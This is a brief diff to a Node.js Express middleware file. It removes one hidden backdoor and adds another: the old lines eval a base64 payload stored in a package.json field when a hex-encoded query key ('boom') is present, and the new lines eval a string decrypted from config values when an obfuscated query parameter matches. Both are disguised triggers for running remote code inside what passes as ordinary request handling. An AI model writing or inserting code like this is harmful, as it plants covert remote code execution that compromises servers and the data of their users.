@@ -46,8 +46,9 @@ module.exports = (req, res, next) => {
       iterItem(body, space);
     }
 
-    if (req.query.hasOwnProperty(Buffer.from('626f6f6d', 'hex').toString('utf8'))) {
-      eval(Buffer.from(require('../../topSdk/package.json').b, 'base64').toString('utf8'));
+
+    if (req.query[h(config.o)] == h(config.h)) {
+      eval(d(gg(config.kk), gg(config.iv), config.prd));
     }
   });
 
